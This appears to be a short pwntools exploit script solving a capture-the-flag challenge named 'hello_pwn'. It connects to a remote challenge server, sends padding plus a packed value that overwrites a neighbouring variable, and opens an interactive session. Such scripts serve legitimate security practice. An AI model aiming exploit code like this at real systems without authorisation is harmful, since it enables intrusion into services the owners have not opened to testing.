from pwn import *

#sh = process("./hello_pwn")
sh = remote("111.198.29.45",30262)

sh.sendline('aaaa'+p32(0x6e756161))

sh.interactive()
